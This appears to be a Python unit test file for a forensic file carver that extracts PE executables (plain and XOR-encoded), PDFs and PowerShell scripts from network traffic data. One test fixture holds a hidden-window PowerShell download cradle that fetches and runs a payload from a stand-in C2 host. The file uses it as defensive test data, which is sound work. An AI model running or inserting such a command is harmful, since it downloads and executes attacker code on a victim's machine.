import unittest

from pcap_decode.carver import FileCarver
from tests.pcap_builder import make_dummy_pe


class TestCarver(unittest.TestCase):
    def setUp(self):
        self.carver = FileCarver()

    def test_carve_pe_executable(self):
        dummy_pe = make_dummy_pe()
        carrier_data = b"RANDOM_TRAFFIC_BEFORE_PE" + dummy_pe + b"RANDOM_TRAFFIC_AFTER"

        results = self.carver.carve_all(carrier_data)
        self.assertTrue(len(results) >= 1)
        pe_item = next(r for r in results if r["extension"] == "exe")
        self.assertEqual(pe_item["data"][:2], b"MZ")
        self.assertEqual(len(pe_item["data"]), len(dummy_pe))

    def test_carve_xor_pe_executable(self):
        dummy_pe = make_dummy_pe()
        xor_key = 0x5A
        xord_pe = bytes([b ^ xor_key for b in dummy_pe])
        carrier_data = b"PREFIX_GARBAGE" + xord_pe + b"SUFFIX_GARBAGE"

        results = self.carver.carve_all(carrier_data)
        xor_item = next((r for r in results if r.get("xor_key") == xor_key), None)
        self.assertIsNotNone(xor_item)
        self.assertEqual(xor_item["data"][:2], b"MZ")
        self.assertEqual(xor_item["data"], dummy_pe)

    def test_carve_powershell_script(self):
        ps_script = b"powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2.bad.com/payload.ps1')\""
        carrier_data = b"USER_INPUT_STREAM_DATA\r\n" + ps_script + b"\r\nLOG_END"

        results = self.carver.carve_all(carrier_data)
        ps_item = next((r for r in results if r["extension"] == "ps1"), None)
        self.assertIsNotNone(ps_item)
        self.assertIn(b"DownloadString", ps_item["data"])

    def test_carve_pdf_document(self):
        pdf_doc = b"%PDF-1.5\r\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\r\n%%EOF\r\n"
        carrier = b"EXTRA_HEADER" + pdf_doc + b"EXTRA_TRAILING"
        results = self.carver.carve_all(carrier)
        pdf_item = next((r for r in results if r["extension"] == "pdf"), None)
        self.assertIsNotNone(pdf_item)
        self.assertEqual(pdf_item["data"], pdf_doc)


if __name__ == "__main__":
    unittest.main()
